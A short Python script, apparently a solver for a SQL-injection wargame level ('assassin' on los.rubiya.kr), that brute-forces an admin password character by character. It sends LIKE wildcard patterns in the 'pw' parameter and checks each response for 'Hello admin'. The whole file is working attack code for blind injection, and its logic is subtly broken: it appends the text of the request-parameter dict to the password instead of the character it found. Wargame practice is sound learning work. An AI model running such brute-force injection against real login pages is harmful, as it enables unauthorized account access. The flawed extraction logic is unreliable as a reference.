import requests

url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
cookies = { "PHPSESSID" : "쿠키값" }

def pw_crack():
    password = ''

    for i in range(1, 9):
        for j in range(1, 128):
            param = "_" * (i-1) + chr(j) + "%"
            params = { "pw" : param }

            request = requests.get(url, params=params, cookies=cookies)

            if "Hello admin" in request.text:
                password = password + str(params)
                print("패스워드:", password)
                break

pw_crack()